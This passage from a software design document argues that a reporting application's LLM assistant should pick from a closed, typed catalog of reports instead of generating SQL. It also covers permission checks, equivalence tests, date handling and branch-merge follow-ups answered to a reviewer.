exceptions are named rather than implicit, and a new report opts _out_
explicitly instead of forgetting to opt in.

This should be done **whether or not the assistant ships**, and doing it first
makes the assistant smaller: catalog entries then compose a scope helper rather
than trusting that each report already remembered. Worth its own PR, sequenced
ahead of phase 1. It is also the kind of change with an exact test: every
report must produce identical numbers before and after.

### 9.2 Simpler alternatives, and why they lose

| Alternative                                    | Why not                                                                                                                                                                                                                                                                                                                                                                                                     |
| ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Keep text-to-SQL, add more guards**          | Guards catch _dangerous_ queries. They cannot catch a _wrong_ one — a query missing the CANCELLED filter is perfectly safe and perfectly incorrect. No amount of guarding reaches the actual risk.                                                                                                                                                                                                          |
| **Text-to-SQL over a curated set of views**    | Better — views could bake in rule 33. But it moves holt's accounting semantics into SQL views that duplicate `lib/reports/`, creating a second source of truth that will drift. The drift is invisible until two numbers disagree.                                                                                                                                                                          |
| **No LLM: a search box over the reports**      | Genuinely good, and **should exist regardless** — most of what people ask is "which report shows me X", which is a routing problem a search box solves with no model, no tokens, and no failure mode. Recommend building it; it is a day of work and reduces assistant load. It does not cover parameter extraction ("…for the Danbury store, last quarter"), which is the part an LLM is actually good at. |
| **Buy it** (Metabase/Looker-style embedded BI) | Solves the general case, but cannot know rule 33 either, and adds a dependency plus a second auth model to a product whose selling point is that it runs from one clone.                                                                                                                                                                                                                                    |

The catalog design is the smallest thing that answers parameterised questions
correctly. Combined with §9.1 it is also _simpler than what exists today_,
because the correctness rule stops being ambient.

### 9.3 Is this the most secure shape?

Yes, and the reason is structural rather than defensive: **the attack surface
is a closed enum.** Text-to-SQL's surface is "any string the model emits", and
every mitigation is a filter on that string — a list of things we thought of.
Here the model's output space is `{ one of N ids } × { typed args }`, validated
by zod against the catalog before anything runs. There is no string to escape
from, no prefix trick, no catalog entry the model can name that does not exist.

Two rules keep it that way, and both belong in review:

1. **A catalog entry never contains a raw query.** The moment one does, the
   closed-enum property is gone and we are back to filtering strings.
2. **Permission is checked server-side after routing, not just before
   prompting.** Filtering the catalog before building the prompt is a UX
   nicety; the run-time check is the control. A model that hallucinated
   `ar.balanceAging` must still be refused.

Keeping the guardrails from §7 costs nothing and means rule 1 is enforced by a
test rather than by reviewer attention.

---

## 10. Verification

- `cd app && npm run validate && npx jest --selectProjects unit`
- **The equivalence test is the important one:** for each catalog entry, assert
  the assistant's numbers equal the report page's numbers for the same
  arguments. If those two ever disagree, one of them is lying to someone.
- Routing tests need no live model — assert against recorded `RouteResult`
  fixtures. Keep model calls out of unit tests entirely.
- A single opt-in integration test per provider, skipped unless the relevant
  key or a reachable local endpoint is present.

---

## 11. Open reconciliations (answers to the seam author)

Answering the items raised in `docs/ai-assistant-review.md`. Where the answer is
"your call", it genuinely is — these are not all mine to decide.

**`CatalogEntry` / `CatalogParam` home (rule 37).** One vocabulary, one owner:
put both in `lib/ai/catalog.ts` and have `routing.ts` import them. Routing
consumes the catalog; the catalog does not depend on routing, so the dependency
runs the right way and there is no cycle.

**`AnswerContext`.** Mine to define, per §4.2. It carries the caller's identity
and nothing else — the session's staff id, role set, permission set, and store
scope. It must NOT carry a Prisma client or a pre-built `where` clause: the
whole point of §4.2 is that each answer re-derives its own scoping from identity
rather than trusting a filter someone else assembled.

**`RoutingProvider` vs `AiProvider`.** Keep `RoutingProvider`. It is the more
honest name — the interface routes and does not generate answers, which is the
entire architectural claim. §5 is what should change; treat this doc as amended.

**`dateRange` as a bare string ("yesterday").** Correct, and design for it: the
model emits a _label_, the code resolves it. Resolution belongs in one helper
over `lib/reports/businessDay.ts`, so "yesterday" means yesterday in the
deployment's configured business timezone — not UTC, and not the model's guess.
Never let a model emit resolved dates; that is arithmetic, and §3's rule is that
the code computes.

**Doc staleness (ask 3).** `docs/domains/reporting.md` was spot-checked as
current and I agree with that read. Two corrections found elsewhere while
answering ask 2, both now fixed on `fix/commission-fallback-comments` (PR #94):
`docs/domains/commission.md` documented the removed `DEFAULT_COMMISSION_TIERS`
fallback in three places, one of which described a `loadTiers()` helper that no
longer exists anywhere in `src`. If an entry ever reports commission, read that
runbook _after_ #94 merges.

**Branch drift — act on this before building the catalog.** Both AI branches
were 8 commits behind `main`. This branch has now merged `main`;
`feat/ai-provider-seam` has not. What you are missing that matters:

- `lib/reports/businessDay.ts` — the timezone-correct day helpers the
  `dateRange` answer above depends on. Building your own date resolution before
  merging will duplicate it.
- The commission fallback removal — `resolveTier` can now return `null`, so any
  commission-shaped answer must render "No plan configured" rather than assume a
  tier exists.
- Two new tripwire tests, which will fail your branch on merge if the catalog
  reintroduces a tenant literal or a second spelling of the revenue statuses.
